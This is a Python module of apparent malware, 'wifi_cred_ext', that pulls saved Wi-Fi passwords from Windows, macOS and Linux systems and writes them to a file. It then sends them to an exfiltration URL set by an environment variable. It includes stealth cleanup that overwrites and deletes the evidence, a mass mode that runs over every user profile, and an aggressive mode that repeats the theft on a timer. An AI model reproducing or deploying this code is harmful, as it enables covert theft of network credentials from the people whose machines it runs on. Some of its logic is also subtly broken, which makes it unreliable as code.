# modules/wifi_cred_ext.py

import os
import platform
import subprocess
import re
import glob
import logging
from modules.logger import log_event
import time
import sys

# ──────────────────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────────────────

WIFI_OUT_PATH = os.path.join(os.path.expanduser("~"), "wifi_credentials.txt")
LOG_FILE = os.path.join(os.path.expanduser("~"), "wifi_cred_ext.log")

# ──────────────────────────────────────────────────────────────────────────────

def log_to_file(message: str):
    """Log messages to a file for debugging and monitoring."""
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def validate_environment():
    """Restrict execution to specific contexts (e.g., specific users or environments)."""
    if os.getuid() != 0:
        log_to_file("Unauthorized user attempted to execute wifi_cred_ext.")
        print("[!] Unauthorized user. Aborting.")
        sys.exit(1)

validate_environment()

# Enhanced error handling for subprocess calls
def safe_subprocess_call(cmd, **kwargs):
    """Wrapper for subprocess calls with enhanced error handling."""
    try:
        return subprocess.check_output(cmd, **kwargs)
    except subprocess.CalledProcessError as e:
        log_to_file(f"Subprocess error: {e}")
        return None
    except Exception as e:
        log_to_file(f"Unexpected error in subprocess call: {e}")
        return None

# Enhanced extract_windows_wifi with logging and error handling
def extract_windows_wifi():
    """
    Uses 'netsh wlan' to enumerate profiles and reveal keys.
    Returns list of {'ssid':..., 'key':...}.
    """
    creds = []
    try:
        out = safe_subprocess_call(["netsh", "wlan", "show", "profiles"], stderr=subprocess.DEVNULL, text=True)
        if not out:
            return creds
        ssids = re.findall(r"All User Profile\s*:\s(.+)", out)
        for ssid in ssids:
            ssid = ssid.strip().strip('"')
            try:
                o2 = safe_subprocess_call(
                    ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                    stderr=subprocess.DEVNULL, text=True
                )
                m = re.search(r"Key Content\s*:\s(.+)", o2)
                key = m.group(1).strip() if m else "<NONE>"
            except Exception as e:
                log_to_file(f"Error extracting key for SSID {ssid}: {e}")
                key = "<ERROR>"
            creds.append({"ssid": ssid, "key": key})
    except Exception as e:
        log_to_file(f"Error in extract_windows_wifi: {e}")
    return creds

def extract_macos_wifi():
    """
    Uses 'security' to fetch Wi‑Fi passwords from Keychain.
    Returns list of {'ssid':..., 'key':...}.
    """
    creds = []
    try:
        out = subprocess.check_output(
            ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"],
            stderr=subprocess.DEVNULL, text=True
        )
        lines = out.splitlines()[1:]
        ssids = []
        for line in lines:
            parts = line.split()
            if parts:
                ssids.append(parts[0])
        for ssid in ssids:
            try:
                # Use -g to get password (will prompt user if not unlocked)
                o2 = subprocess.check_output(
                    ["security", "find-generic-password", "-D", "AirPort network password", "-ga", ssid],
                    stderr=subprocess.STDOUT, text=True
                )
                m = re.search(r'password:\s*"(.+)"', o2)
                key = m.group(1) if m else "<NONE>"
            except subprocess.CalledProcessError as cpe:
                key = "<ERROR>"
            creds.append({"ssid": ssid, "key": key})
    except Exception as e:
        logging.error(f"[wifi_cred_ext] extract_macos_wifi error: {e}")
        log_event({"type": "wifi_extraction_failed", "error": str(e)})
    return creds

def extract_linux_wifi():
    """
    Check both NetworkManager and wpa_supplicant configurations for SSID & PSK.
    Requires root. Returns list of {'ssid':..., 'key':...}.
    """
    creds = []
    # 1) NetworkManager
    nm_dir = "/etc/NetworkManager/system-connections"
    if os.path.isdir(nm_dir):
        for fname in os.listdir(nm_dir):
            path = os.path.join(nm_dir, fname)
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                m_ssid = re.search(r"^\s*ssid=(.+)$", content, re.MULTILINE)
                m_key = re.search(r"^\s*psk=(.+)$", content, re.MULTILINE)
                ssid = m_ssid.group(1).strip() if m_ssid else fname
                key = m_key.group(1).strip() if m_key else "<NONE>"
                creds.append({"ssid": ssid, "key": key})
            except Exception:
                continue

    # 2) wpa_supplicant (Debian/Ubuntu default)
    wpa_paths = glob.glob("/etc/wpa_supplicant/wpa_supplicant*.conf")
    for wpa_path in wpa_paths:
        try:
            with open(wpa_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            curr_ssid = None
            curr_psk = None
            for line in lines:
                line = line.strip()
                if line.startswith("ssid="):
                    curr_ssid = line.split("=", 1)[1].strip().strip('"')
                if line.startswith("psk="):
                    curr_psk = line.split("=", 1)[1].strip().strip('"')
                if curr_ssid and curr_psk:
                    creds.append({"ssid": curr_ssid, "key": curr_psk})
                    curr_ssid = None
                    curr_psk = None
        except Exception:
            continue

    return creds

def dump_wifi_credentials():
    """
    Detect current OS, extract Wi‑Fi credentials, write to WIFI_OUT_PATH, log event.
    """
    os_type = platform.system()
    result = []
    start_time = time.time()
    try:
        if os_type == "Windows":
            result = extract_windows_wifi()
        elif os_type == "Darwin":
            result = extract_macos_wifi()
        elif os_type == "Linux":
            result = extract_linux_wifi()
        else:
            return False

        if not result:
            return False

        os.makedirs(os.path.dirname(WIFI_OUT_PATH), exist_ok=True)
        with open(WIFI_OUT_PATH, "w", encoding="utf-8") as f:
            for entry in result:
                f.write(f"SSID: {entry['ssid']}  |  Key: {entry['key']}\n")
        log_event({"type": "wifi_dump", "file": WIFI_OUT_PATH})
        log_to_file(f"Wi-Fi credentials dumped to {WIFI_OUT_PATH}")
        return True

    except Exception as e:
        log_to_file(f"Error in dump_wifi_credentials: {e}")
        return False
    finally:
        end_time = time.time()
        log_to_file(f"dump_wifi_credentials executed in {end_time - start_time:.2f} seconds.")

# Enhanced exfiltration with logging
def exfiltrate_wifi_creds():
    try:
        with open(WIFI_OUT_PATH, "r", encoding="utf-8") as f:
            creds = f.read()
        import requests
        requests.post(EXFIL_URL, data={"creds": creds}, timeout=10)
        log_to_file(f"Exfiltrated Wi-Fi credentials to {EXFIL_URL}")
    except Exception as e:
        log_to_file(f"Exfiltration failed: {e}")

# Enhanced stealth cleanup with logging
def stealth_cleanup():
    # Overwrite and delete output file for stealth
    try:
        if os.path.exists(WIFI_OUT_PATH):
            with open(WIFI_OUT_PATH, "w") as f:
                f.write(" " * 4096)
            os.remove(WIFI_OUT_PATH)
            log_to_file("Stealth cleanup completed.")
    except Exception as e:
        log_to_file(f"Stealth cleanup failed: {e}")

# Enhanced mass mode with logging
def mass_wifi_dump():
    # Try to dump from all user profiles (Windows/Linux)
    if platform.system() == "Windows":
        base = "C:\\Users"
        for user in os.listdir(base):
            prof = os.path.join(base, user)
            if os.path.isdir(prof):
                os.environ["USERPROFILE"] = prof
                dump_wifi_credentials()
                if EXFIL_URL:
                    exfiltrate_wifi_creds()
    elif platform.system() == "Linux":
        base = "/home"
        for user in os.listdir(base):
            prof = os.path.join(base, user)
            if os.path.isdir(prof):
                os.environ["HOME"] = prof
                dump_wifi_credentials()
                if EXFIL_URL:
                    exfiltrate_wifi_creds()

    log_to_file("Mass Wi-Fi dump completed.")

if __name__ == "__main__":
    ok = dump_wifi_credentials()
    EXFIL_URL = os.getenv("WIFI_CRED_EXFIL_URL")
    AGGRESSIVE = os.getenv("WIFI_CRED_AGGRESSIVE") == "1"
    STEALTH = os.getenv("WIFI_CRED_STEALTH") == "1"
    MASS_MODE = os.getenv("WIFI_CRED_MASS") == "1"
    INTERVAL = int(os.getenv("WIFI_CRED_INTERVAL", "300"))

    if ok:
        log_to_file(f"Wi‑Fi credentials dumped to {WIFI_OUT_PATH}")
        if EXFIL_URL:
            exfiltrate_wifi_creds()
        if STEALTH:
            stealth_cleanup()
        if MASS_MODE:
            log_to_file("[*] Mass mode enabled: dumping from all user profiles.")
            mass_wifi_dump()
        # Aggressive mode: repeat dump and exfil every INTERVAL seconds
        if AGGRESSIVE:
            import time
            log_to_file(f"[*] Aggressive mode enabled: will repeatedly dump and exfil Wi‑Fi credentials every {INTERVAL}s.")
            while True:
                time.sleep(INTERVAL)
                dump_wifi_credentials()
                if EXFIL_URL:
                    exfiltrate_wifi_creds()
                if STEALTH:
                    stealth_cleanup()
    else:
        log_to_file("[!] Failed to dump Wi‑Fi credentials (need root/admin?).")
